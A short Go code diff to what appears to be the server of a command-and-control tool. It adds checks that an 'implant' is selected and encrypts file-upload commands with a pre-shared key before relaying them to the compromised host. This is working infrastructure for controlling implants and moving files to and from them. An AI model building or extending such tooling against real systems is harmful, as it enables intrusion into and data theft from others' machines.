@@ -210,14 +210,22 @@ func handleNewConnectionCLI(conn net.Conn) {
 			continue
 		}
 		if strings.HasPrefix(decryptedCommand, "download") {
+			if currentClient == nil {
+				sendResponseRemote(conn, "No implant selected")
+				continue
+			}
 			resp := handleImplantCommand(currentClient, command)
 			saveFilePath(decryptedCommand, resp)
 			sendResponseRemote(conn, "Downloaded File: "+decryptedCommand)
 			continue
 		}
 		if strings.HasPrefix(decryptedCommand, "upload") {
+			if currentClient == nil {
+				sendResponseRemote(conn, "No implant selected")
+				continue
+			}
 			handleUpload(currentClient, decryptedCommand)
-			//sendResponseRemote(conn, "Uploaded File: "+decryptedCommand)
+			sendResponseRemote(conn, "Uploaded File: "+decryptedCommand)
 			continue
 		}
 		if currentClient == nil {
@@ -445,9 +453,17 @@ func handleUpload(client *Client, command string) bool {
 	}
 
 	encodedData := base64.StdEncoding.EncodeToString(fileData)
+
 	uploadCommand := fmt.Sprintf("upload %s %s", remotePath, encodedData)
 
-	sendResponseRemote(client.conn, uploadCommand)
+	// Encrypt the file data
+	encryptedCommand, err := encryption.Encrypt(uploadCommand, PSK)
+	if err != nil {
+		log.Println("Error encrypting ping command:", err)
+		return false
+	}
+
+	handleImplantCommand(currentClient, encryptedCommand)
 
 	return true
 }
